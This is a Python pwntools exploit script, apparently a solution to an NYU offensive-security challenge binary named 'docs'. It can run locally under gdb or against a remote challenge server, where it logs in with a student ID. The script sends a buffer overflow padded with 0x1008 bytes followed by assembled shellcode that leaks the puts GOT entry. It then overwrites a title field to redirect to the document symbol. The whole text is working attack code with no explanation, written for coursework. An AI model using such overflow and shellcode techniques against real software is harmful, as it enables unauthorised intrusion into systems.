from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./docs"

LOCAL = True

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    b add_title
    continue
    ''', aslr=False)
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1291)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./libc.so.6"

target_elf = ELF(target_file, checksec=False)
libc = ELF(libc, checksec=False)

# Build the shell code:
doc_address = target_elf.symbols.document
print(f'doc_address: {hex(doc_address)}')
create_document = target_elf.symbols.create_document
print(f'create_document: {hex(create_document)}')
puts_got = target_elf.got.puts
print(f'puts_got: {hex(puts_got)}')

shell_code = f'''
mov rdi, 1
mov rsi, {hex(puts_got)}
mov rdx, 8
mov rax, 1
syscall
mov rax, 60
xor rdi, rdi
mov rax, {hex(create_document)}
call rax
'''

print(f'Shell code: {shell_code}')

shellcode = asm(shell_code)
p.recvuntil(b'text: ')
p.sendline(b'A' * 0x1008 + shellcode)

p.recvuntil(b'title: ')
p.send((b'B' * 0x38) + p64(doc_address))


p.interactive()
